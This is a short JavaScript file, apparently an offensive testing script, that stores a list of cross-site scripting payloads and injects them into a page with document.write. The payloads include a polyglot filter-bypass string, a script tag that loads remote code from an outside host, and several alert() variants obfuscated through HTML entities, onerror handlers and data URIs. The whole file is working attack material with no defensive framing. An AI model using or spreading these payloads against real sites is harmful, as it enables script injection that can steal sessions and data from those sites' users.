(function() {
    const payloads = [
        'JavaScript://%250A/*?/*\'/*"/*\"/*`/*\\`/*%26apos;)/*<!--></Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)("rix4uni")}//><Base/Href=//X55.is\\76-->',
        '<Script/Src=//jxss.netlify.app/1.js></Script>',
        '<img src="x" onerror="alert(1)">',
        '<img src="x" onerror="al&#x65;rt(3)">',
        '<img src="x" onerror="alert&lpar;1&rpar;">',
        '<img src="x" onerror="alert&#40;1&#41;">',
        '<img src="x" onerror="(alert)(1)">',
        '<img src="x" onerror="a=alert,a(1)">',
        '<img src="x" onerror="[1].find(alert)">',
        '<img src="javascript:alert(1)">',
        '<img src="x" onerror="alert(1)">',
        '<img src="data:text/html,<script>alert(1)</script>">',
        '<script src="data:text/javascript,alert(1)">',
        // Add more payloads here
    ];

    let index = 0;

    function tryPayload() {
        if (index >= payloads.length) {
            console.log('None of the payloads triggered');
            return;
        }

        // Use document.write to ensure the payloads are executed properly
        document.write(payloads[index]);

        index++;
        // You may want to add a delay before trying the next payload
        // setTimeout(tryPayload, 1000);
    }

    tryPayload();
})();